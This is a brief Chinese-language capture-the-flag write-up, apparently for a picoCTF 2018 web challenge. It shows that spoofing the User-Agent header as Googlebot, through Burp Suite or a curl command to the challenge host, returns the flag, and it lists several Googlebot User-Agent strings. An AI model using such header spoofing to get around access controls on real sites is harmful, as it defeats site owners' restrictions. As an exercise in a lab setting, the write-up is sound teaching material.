user-agent 簡單來說，就是讓伺服器參考以傳送不同形式的資料至用戶端
利用 burpsuite 修改 user-agent 為 google 即可得到 flag

以下幾個皆可使用

Mozilla/5.0 (Googlebot/2.1；+http://www.google.com/bot.html)

Mozilla/5.0 AppleWebKit/537.36 (compatible; Googlebot/2.1；+http://www.google.com/bot.html) Safari/537.36)
 
Googlebot/2.1 (+http://www.google.com/bot.html)


或
curl http://2018shell3.picoctf.com:46162/flag -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"

